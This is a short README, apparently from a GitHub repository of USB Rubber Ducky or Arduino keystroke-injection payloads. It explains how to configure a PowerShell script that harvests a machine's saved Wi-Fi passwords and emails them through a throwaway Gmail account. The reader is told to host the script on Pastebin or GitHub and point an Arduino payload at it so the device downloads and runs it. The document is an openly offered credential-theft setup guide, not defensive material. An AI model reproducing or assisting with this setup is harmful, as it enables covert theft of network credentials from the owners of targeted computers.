# Powershell Wifi Pass to Mail Readme

Paste the script on pastebin (is sometimes blocked on company network), or like I do; on github.

The [Wifi Pass to Mail](https://github.com/datasnoken/duckies/blob/master/Powershell%20Scripts/Powershell_Wifi_Pass_to_Mail) needs some modification

Line 2

System.Net.NetworkCredential('DUMMY_EMAIL@gmail.com', 'DUMMY_EMAIL_PASSWORD')
* 'DUMMY_EMAIL@gmail.com' -> Some dummy gmail address you create
* 'DUMMY_EMAIL_PASSWORD' -> Password of said dummy gmail account

$ReportEmail.From = 'DUMMY_EMAIL@gmail.com'
* 'DUMMY_EMAIL@gmail.com' -> The dummy gmail address again

$ReportEmail.To.Add('EMAIL@gmail.com')
* 'EMAIL@gmail.com' -> The email address you want the passwords sent to



View the script as 'raw' and paste the link in line 30 of the [arduino_run_script_from_web](https://github.com/datasnoken/duckies/blob/master/Arduino%20Payloads/arduino_run_script_from_web.txt) script, where it says "YOUR_SCRIPT_HOSTED_ON_SOME_SITE_AS_RAW" and compile it to your Ducky


???
wifi passwords ¯\_(ツ)_/¯
